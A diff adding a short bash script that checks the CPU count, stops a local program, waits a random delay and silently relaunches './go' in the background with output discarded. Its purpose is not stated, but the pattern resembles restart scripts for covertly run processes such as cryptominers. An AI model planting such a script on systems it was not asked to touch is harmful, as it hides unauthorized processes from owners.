@@ -1,0 +1,15 @@
+#!/bin/bash
+PR=1
+PR=$(cat /proc/cpuinfo | grep model | grep name | wc -l)
+
+if [ $PR -lt 14 ]; then
+	sleep 15
+	./stop
+	sleep 3
+	RANGE=240
+	s=$RANDOM
+	let "s %= $RANGE"
+	sleep $s
+	nohup ./go >>/dev/null &	
+fi 
+
